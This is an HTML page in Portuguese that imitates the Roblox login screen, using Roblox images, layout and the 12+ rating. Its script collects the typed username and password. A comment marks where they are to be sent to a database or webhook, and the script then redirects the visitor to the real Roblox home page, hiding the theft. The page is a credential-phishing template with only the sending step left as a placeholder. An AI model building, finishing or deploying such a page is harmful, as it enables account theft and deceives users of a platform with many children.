<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    
    <style>
        /* FONTE OFICIAL ROBLOX */
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #232527; /* Fundo escuro padrão */
            display: flex; flex-direction: column; overflow: hidden;
        }

        /* HEADER - ORGANIZAÇÃO TOTAL */
        .roblox-header {
            width: 100%; height: 44px; background: #232527;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 16px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
            border-bottom: 1px solid #454749;
        }

        .header-left { display: flex; align-items: center; flex-grow: 1; }

        .roblox-logo {
            height: 28px; width: 28px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
            background-size: contain; background-repeat: no-repeat;
            margin-right: 15px; cursor: pointer;
        }

        .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; }
        
        /* BARRA DE PESQUISA - AJUSTE DE POSIÇÃO E TAMANHO */
        .search-container {
            margin-left: 20px; position: relative; width: 100%; max-width: 450px;
        }

        .search-container input {
            width: 100%; height: 32px; background: rgba(255, 255, 255, 0.1);
            border: 1px solid #454749; border-radius: 8px;
            padding-left: 35px; color: #fff; font-size: 14px; outline: none;
        }

        .search-icon {
            position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
            width: 16px; height: 16px; opacity: 0.7;
        }

        /* BOTÕES DIREITOS DO HEADER */
        .header-right { display: flex; align-items: center; gap: 8px; }
        .btn-header-signup { background: #0084ff; border: none; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }
        .btn-header-login { background: transparent; border: 1px solid #fff; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }

        /* ÁREA CENTRAL DE LOGIN */
        .main-content { 
            flex: 1; display: flex; align-items: center; justify-content: center; 
            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), 
                        url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center;
        }
        
        .login-card {
            background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
            width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        .login-card h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; }
        
        .input-group input {
            width: 100%; height: 44px; background-color: #191b1d; border: 1px solid #252728;
            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
            box-sizing: border-box; font-size: 15px;
        }

        /* BOTÃO ENTRAR COM BORDA BRANCA IGUAL À IMAGEM 2 */
        .btn-submit {
            width: 100%; height: 40px; background-color: transparent; border: 1px solid #ffffff;
            color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0;
            font-weight: 500; transition: background 0.2s;
        }

        .forgot-pass { color: #fff; text-decoration: none; font-size: 13px; display: block; margin-bottom: 25px; }

        .btn-alt {
            width: 100%; height: 44px; background-color: #4f5153; border: none;
            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 10px; cursor: pointer;
            font-weight: 600;
        }

        .signup-footer { color: #fff; font-size: 14px; margin-top: 30px; }
        .signup-footer span { text-decoration: underline; cursor: pointer; font-weight: 600; }

        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; font-size: 10px; }
    </style>
</head>
<body>

<header class="roblox-header">
    <div class="header-left">
        <div class="roblox-logo"></div>
        <nav class="header-nav">
            <span>Destaques</span>
            <span>Mercado</span>
            <span>Criar</span>
            <span>Robux</span>
        </nav>
        <div class="search-container">
            <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            <input type="text" placeholder="Pesquisar">
        </div>
    </div>
    <div class="header-right">
        <button class="btn-header-signup">Cadastrar-se</button>
        <button class="btn-header-login">Entrar</button>
    </div>
</header>

<main class="main-content">
    <div class="login-card">
        <h1>Entrar na Roblox</h1>
        <div class="input-group">
            <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
            <input type="password" id="pass" placeholder="Senha">
        </div>
        
        <button class="btn-submit" onclick="execLogin()">Entrar</button>
        
        <a href="#" class="forgot-pass">Esqueceu a senha ou nome de usuário?</a>
        
        <button class="btn-alt">Envie-me um código único por e-mail</button>
        <button class="btn-alt">Entrada rápida</button>
        
        <p class="signup-footer">
            Não possui uma conta? <span>Cadastrar-se</span>
        </p>
    </div>
</main>

<div class="footer-rating">
    <span style="background: #fff; color: #000; padding: 1px 4px; border-radius: 2px; font-weight: bold; margin-right: 5px;">12</span>
    CLASSIFICAÇÃO INDICATIVA: 12 ANOS
</div>

<script>
    function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if(u && p) {
            // Lógica de sincronização com o banco de dados/webhook aqui
            window.location.href = "https://www.roblox.com/home";
        }
    }
</script>

</body>
</html>
